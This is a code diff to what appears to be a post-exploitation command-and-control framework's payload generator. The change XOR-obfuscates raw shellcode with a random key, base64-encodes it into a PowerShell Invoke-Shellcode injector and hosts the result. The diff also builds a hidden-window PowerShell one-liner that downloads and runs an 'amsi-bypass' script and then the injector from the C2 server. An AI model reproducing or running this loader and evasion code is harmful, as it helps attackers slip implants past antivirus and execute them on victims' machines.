@@ -1083,22 +1083,35 @@ class Payloads(object):
         self.QuickstartLog(f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -c %s" % command)
         self.QuickstartLog(f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % b64command)
 
-    def createPSInjector(self,b64shellcodefile,name):
+    def createPSInjector(self,shellcodePath,name):
         self.QuickstartLog(f"C# Powershell Injector: {self.BaseDirectory}{name}_injector.ps1")
 
+        with open(shellcodePath, 'rb') as f:
+            shellcode = bytearray(f.read())
+
+        key = bytearray(os.urandom(16))
+        k = 0
+        for i in range(len(shellcode)):
+            if k == len(key):
+                k = 0
+            shellcode[i] = shellcode[i] ^ key[k]
+            k = k + 1
+
+        b64shellcode = base64.b64encode(bytes(shellcode)).decode('UTF-8')
+        b64key = base64.b64encode(bytes(key)).decode('UTF-8')
         with open("%sInvoke-Shellcode.ps1" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
+
         self.PSInjector = str(content) \
             .replace("#REPLACECONNECTURL#", self.PayloadCommsHost.strip("\"")) \
             .replace("#REPLACEQUICKCOMMAND#", self.QuickCommand) \
-            .replace("#REPLACEB64SHELLCODE#", name)
+            .replace("#BASE64SHELLCODE#", b64shellcode) \
+            .replace("#BASE64KEY",b64key)
 
         with open("%s%s_injector.ps1" % (self.BaseDirectory, name), 'w') as f:
             f.write(self.PSInjector)
 
         insert_hosted_file("%s%s_psload" % (self.QuickCommand, name), "%s%s_injector.ps1" % (PayloadsDirectory, name),
-                           "text/html", "No", "Yes")
-        insert_hosted_file("%s%s" % (self.QuickCommand, name), b64shellcodefile,
                            "text/html", "No", "Yes")
 
         command = f''' "IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}amsi-bypass');IEX(new-object system.net.webclient).downloadString('{self.FirstURL}/{self.QuickCommand}{name}_psload')" '''
@@ -1110,12 +1123,12 @@ class Payloads(object):
             f"Download and execute C# Powershell Loader: powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % b64command)
 
     def CreatePSInjectors(self, name):
-        shellcodeFiles = [("Sharp_v4_x86_Shellcode.b64", "x64"),
-                          ("Sharp_v4_x64_Shellcode.b64", "86"),
-                          ("PBindSharp_v4_x86_Shellcode.b64", "x86"),
-                          ("PBindSharp_v4_x64_Shellcode.b64", "x64"),
-                          ("FCommSharp_v4_x86_Shellcode.b64", "x86"),
-                          ("FCommSharp_v4_x64_Shellcode.b64", "x64")]
+        shellcodeFiles = [("Sharp_v4_x86_Shellcode.bin", "x64"),
+                          ("Sharp_v4_x64_Shellcode.bin", "86"),
+                          ("PBindSharp_v4_x86_Shellcode.bin", "x86"),
+                          ("PBindSharp_v4_x64_Shellcode.bin", "x64"),
+                          ("FCommSharp_v4_x86_Shellcode.bin", "x86"),
+                          ("FCommSharp_v4_x64_Shellcode.bin", "x64")]
 
         for sf in shellcodeFiles:
             self.createPSInjector(f"{self.BaseDirectory}{name}{sf[0]}",f"{name}{sf[0]}")
